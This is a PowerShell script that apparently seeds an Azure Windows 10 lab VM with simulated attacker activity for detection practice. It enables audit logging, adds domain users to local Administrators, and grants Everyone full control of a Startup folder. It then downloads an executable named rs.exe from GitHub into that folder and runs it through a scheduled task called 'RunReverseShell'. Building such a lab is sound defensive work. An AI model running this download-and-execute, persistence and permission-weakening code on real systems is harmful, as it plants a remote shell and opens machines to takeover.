param (
    [string]$adminPassword,
    [string]$resourceGroupName
)

Import-Module Az.Compute
Import-Module Az.Accounts

Connect-AzAccount -Identity

## Logon users to win10, setting audit
$w10script = @"
Write-Output "Setting Advanced Audit Policies..."
# Logon/Logoff
& auditpol.exe /set /subcategory:"Logon" /success:enable /failure:enable
& auditpol.exe /set /subcategory:"Logoff" /success:disable
& auditpol.exe /set /subcategory:"Special Logon" /success:enable /failure:enable

# Detailed tracking
& auditpol.exe /set /subcategory:"Process Creation" /success:enable /failure:enable

# Privilege use
& auditpol.exe /set /subcategory:"Sensitive Privilege Use" /success:enable /failure:enable

Write-Output "Enabling scriptblock logging..."
New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -force
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1 -Type DWord

gpupdate /force

Write-Output "Adding users to Local Admins..."
net localgroup Administrators "ODOMAIN\candice.kevin" /add
net localgroup Administrators "ODOMAIN\ssupport" /add


Write-Output "Creating profiles for candice.kevin and ssupport...."
# Define domain users and their profile paths
`$users = `@(
    `@{
        UserName = "ODOMAIN\candice.kevin"
        ProfilePath = "C:\Users\candice.kevin"
    },
    `@{
        UserName = "ODOMAIN\ssupport"
        ProfilePath = "C:\Users\ssupport"
    }
)

# Define the default profile path
`$defaultProfile = "C:\Users\Default"

# Function to get the user's SID
function Get-UserSID {
    param (
        [string]`$UserName
    )
    `$user = New-Object System.Security.Principal.NTAccount(`$UserName)
    `$sid = `$user.Translate([System.Security.Principal.SecurityIdentifier])
    return `$sid.Value
}

# Function to set registry profile information
function Set-RegistryProfile {
    param (
        [string]`$SID,
        [string]`$ProfilePath
    )
    `$regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\`$SID"
    if (!(Test-Path `$regPath)) {
        New-Item -Path `$regPath -Force | Out-Null
    }
    Set-ItemProperty -Path `$regPath -Name "ProfileImagePath" -Value `$ProfilePath
    Set-ItemProperty -Path `$regPath -Name "Flags" -Value 0
    Set-ItemProperty -Path `$regPath -Name "State" -Value 0
}

# Iterate over each user
foreach (`$user in `$users) {
    `$userName = `$user.UserName
    `$profilePath = `$user.ProfilePath

    Write-Output "Processing user: `$userName"
    Write-Output "Profile Path: '`$profilePath'"

    # 1. Copy the Default Profile
    if (!(Test-Path `$profilePath)) {
        Write-Output "Copying Default Profile to `$profilePath..."
        #`$robocopyCommand = "robocopy `$defaultProfile `$profilePath /MIR /SEC /XJ /XD 'Application Data'"
        #Invoke-Expression `$robocopyCommand
        Start-Process -FilePath "robocopy" -ArgumentList "`$defaultProfile `$profilePath /MIR /SEC /XJ /XD 'Application Data'" -Wait -NoNewWindow
    } else {
        Write-Output "Profile already exists at `$profilePath."
    }

    # 2. Get the User's SID
    `$sid = Get-UserSID -UserName `$userName
    Write-Output "User SID for `$userName : `$sid"

    # 3. Set the Profile Path in the Registry
    Write-Output "Setting registry for profile..."
    Set-RegistryProfile -SID `$sid -ProfilePath `$profilePath

    # 4. Set Permissions for the User
    Write-Output "Setting permissions for `$userName on `$profilePath..."
    `$acl = Get-Acl `$profilePath
    `$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule(
        `$userName, "FullControl", "ContainerInherit, ObjectInherit", "None", "Allow"
    )
    `$acl.SetAccessRule(`$accessRule)
    Set-Acl -Path `$profilePath -AclObject `$acl

    Write-Output "Profile setup complete for `$userName."
}

write-output "Force creating Startup Folder and Downloading directly to the Startup folder..."
`$DownloadUrl = "https://github.com/secpfe/FundyLabs/raw/refs/heads/main/rs.exe"
`$startupFolder = "C:\users\candice.kevin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
New-Item -ItemType Directory -Path `$startupFolder -Force
`$destination = `$startupFolder + "\rs.exe"
Invoke-WebRequest -Uri `$DownloadUrl -OutFile `$destination
write-output "Done downloading!"

schtasks /create /tn "RunCMD" /tr "cmd.exe /c echo hi " /sc ONCE /st 23:59 /ru "ODOMAIN\candice.kevin" /rp "$adminPassword"
schtasks /run /tn "RunCMD"
schtasks /create /tn "RunCMD2" /tr "cmd.exe /c echo hi " /sc ONCE /st 23:59 /ru "ODOMAIN\ssupport" /rp "$adminPassword"
schtasks /run /tn "RunCMD2"

Write-Output "All profiles created successfully!"


Write-Output "Simulating Candice download..."

`$DownloadUrl = "https://github.com/secpfe/FundyLabs/raw/refs/heads/main/rs.exe"
`$ExeName     = "rs.exe"
`$UserName    = "ODOMAIN\candice.kevin"
`$Password    = "$adminPassword"
`$startupFolder = "C:\Users\candice.kevin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

# Drop a small PowerShell script on disk (C:\Temp\DownloadStartup.ps1)

`$downloadScript = `@"
param(
    [string]```$DownloadUrl,
    [string]```$ExeName
)
Write-Output "Downloading from ```$DownloadUrl..."

# Startup folder 
```$startupFolder = "C:\Users\candice.kevin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
if (!(Test-Path ```$startupFolder)) {
    New-Item -ItemType Directory -Path ```$startupFolder -Force | Out-Null
}

# Get the folder's ACL (Access Control List)
```$acl = Get-Acl ```$startupFolder

# Create a new rule to allow "Everyone" full access
```$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone","FullControl","ContainerInherit, ObjectInherit","None","Allow")

# Add the rule to the ACL
```$acl.AddAccessRule(```$accessRule)

# Apply the updated ACL to the folder
Set-Acl -Path ```$startupFolder -AclObject ```$acl

```$destination = Join-Path ```$startupFolder ```$ExeName
Invoke-WebRequest -Uri ```$DownloadUrl -OutFile ```$destination

Write-Output "Downloaded to ```$destination"
"`@

# Create a temp directory if needed
if (!(Test-Path "C:\Temp")) {
    New-Item -ItemType Directory -Path "C:\Temp" | Out-Null
}

# Write the download script to disk
`$downloadScriptPath = "C:\Temp\DownloadStartup.ps1"
Set-Content -Path `$downloadScriptPath -Value `$downloadScript -Force -Encoding UTF8


# Download rs.exe directly to the Startup file path to avoid profile activation delays
`$destination = Join-Path `$startupFolder `$ExeName
Invoke-WebRequest -Uri `$DownloadUrl -OutFile `$destination



# -----------------------
# Declaring P/Invoke definitions
# -----------------------
Add-Type -TypeDefinition `@"
using System;
using System.Text;
using System.Runtime.InteropServices;

public class NativeMethods {
    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern bool LogonUser(
        string lpszUsername,
        string lpszDomain,
        string lpszPassword,
        int dwLogonType,
        int dwLogonProvider,
        out IntPtr phToken);

    [DllImport("kernel32.dll", CharSet=CharSet.Auto, SetLastError=true)]
    public static extern bool CloseHandle(IntPtr handle);

    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern bool CreateProcessAsUser(
        IntPtr hToken,
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        int dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
    public struct STARTUPINFO {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    // Logon types
    public const int LOGON32_LOGON_INTERACTIVE = 2;
    public const int LOGON32_PROVIDER_DEFAULT  = 0;
}
"`@

Write-Host "`n[+] Attempting interactive logon for user: `$UserName"

`$domain = ""
`$user   = `$UserName
if (`$UserName -like "*\*") {
    `$domain = `$UserName.Split("\")[0]
    `$user   = `$UserName.Split("\")[1]
}

[IntPtr]`$userToken = [IntPtr]::Zero
`$logonOk = [NativeMethods]::LogonUser(
    `$user,
    `$domain,
    `$Password,
    [NativeMethods]::LOGON32_LOGON_INTERACTIVE,
    [NativeMethods]::LOGON32_PROVIDER_DEFAULT,
    [ref] `$userToken
)

if (!`$logonOk) {
    `$err = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
    throw "LogonUser (interactive) failed. Win32 error: `$err"
}

Write-Output "[+] LogonUser succeeded. We have an interactive token for `$UserName."

Write-Output "`n[+] Creating a scheduled task to run DownloadStartup.ps1 as `$UserName..."
schtasks /create /tn "RunDownload" /tr "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Temp\DownloadStartup.ps1 -DownloadUrl `$DownloadUrl -ExeName `$ExeName" /sc ONCE /st 23:59 /ru "ODOMAIN\candice.kevin" /rp "`$Password"  /RL HIGHEST  /F 
Write-Output "`n[+] Executing download as `$UserName..."
schtasks /run /tn "RunDownload"

Write-Output "`n[+] Done. There should be Event Log for a Type 2 logon, and the exe file should be placed in candice.kevin's Startup folder."


Write-Output "[+] Creating a scheduled task to run the downloaded rs.exe running under candice..."
schtasks /create /tn "RunReverseShell" /tr "'C:\Users\candice.kevin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\rs.exe'" /sc ONCE /st 23:59 /ru "ODOMAIN\candice.kevin" /rp "`$Password"  /RL HIGHEST  /F 

`$Path = "C:\Users\candice.kevin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\rs.exe"
`$PathDir = "C:\Users\candice.kevin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
`$task = Get-ScheduledTask -TaskName "RunReverseShell"
`$newAction = New-ScheduledTaskAction -Execute `$Path 
Set-ScheduledTask -TaskName "RunReverseShell" -Action `$newAction -Trigger `$task.Triggers -User 'ODOMAIN\candice.kevin' -Password `$Password

Write-Output "[+] Running rs.exe..."
Start-ScheduledTask -TaskName "RunReverseShell"
schtasks /run /tn "RunReverseShell"

Write-Output "`n[+] There should be 4688 events for rs.exe."

`$UserName    = "odomain\ssupport"
`$Password    = "$adminPassword"

Write-Host "`n[+] Attempting interactive logon for user: `$UserName"

`$domain = ""
`$user   = `$UserName
if (`$UserName -like "*\*") {
    `$domain = `$UserName.Split("\")[0]
    `$user   = `$UserName.Split("\")[1]
}

[IntPtr]`$userToken = [IntPtr]::Zero
`$logonOk = [NativeMethods]::LogonUser(
    `$user,
    `$domain,
    `$Password,
    [NativeMethods]::LOGON32_LOGON_INTERACTIVE,
    [NativeMethods]::LOGON32_PROVIDER_DEFAULT,
    [ref] `$userToken
)

if (!`$logonOk) {
    `$err = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
    throw "LogonUser (interactive) failed. Win32 error: `$err"
}

Write-Output "[+] LogonUser succeeded. We have an interactive token for `$UserName."
Write-Output "`n[+] There should be Event Log for a Type 2 logon for `$UserName."

"@

$output = Invoke-AzVMRunCommand -ResourceGroupName $resourceGroupName -VMName "win10" -CommandId "RunPowerShellScript" -ScriptString $w10script 

# View the full output
$output.Value | ForEach-Object { $_.Message }

